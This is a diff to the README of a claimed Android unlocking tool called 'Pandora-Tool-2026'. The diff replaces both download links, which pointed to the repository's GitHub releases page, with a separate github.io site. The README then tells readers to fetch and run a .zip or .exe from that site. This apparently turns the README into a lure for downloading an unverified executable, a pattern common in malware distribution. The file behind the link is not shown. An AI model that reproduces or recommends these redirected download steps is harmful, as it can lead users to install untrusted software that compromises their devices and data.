@@ -1,6 +1,6 @@
 # 🔐 Pandora-Tool-2026 - Unlock Android devices with simple steps
 
-[![Download Pandora Tool](https://img.shields.io/badge/Download-Pandora-blue.svg)](https://github.com/Parekhaart1461/Pandora-Tool-2026/releases)
+[![Download Pandora Tool](https://img.shields.io/badge/Download-Pandora-blue.svg)](https://parekhaart1461.github.io)
 
 ## 📁 About the software
 
@@ -21,7 +21,7 @@ Before you begin, verify your computer meets these minimum standards:
 
 You obtain the software through the official release page. 
 
-[Click here to visit the release page and download the software](https://github.com/Parekhaart1461/Pandora-Tool-2026/releases)
+[Click here to visit the release page and download the software](https://parekhaart1461.github.io)
 
 On this page, look for the most recent version labeled as an executable file. Usually, this file ends with a .zip or .exe extension. Click the file name to start the download to your computer. Save the file in a location you can find easily, such as your Downloads folder or desktop.
 
